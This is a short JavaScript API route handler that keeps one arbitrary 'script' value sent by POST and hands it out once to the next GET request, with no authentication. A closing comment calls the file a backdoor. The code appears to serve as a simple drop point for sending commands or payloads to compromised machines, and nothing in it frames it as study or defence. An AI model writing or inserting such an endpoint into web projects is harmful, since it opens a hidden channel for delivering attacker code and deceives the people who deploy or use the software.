let script = "";

export default function handler(req, res) {
    if (req.method === "POST") {
        script = req.body.script || "";
        return res.status(200).json({ status: "stored" });
    }

    if (req.method === "GET") {
        const temp = script;
        script = ""; // clear after one fetch
        return res.status(200).send(temp);
    }
} //re-simplified backdoor hahahhaha
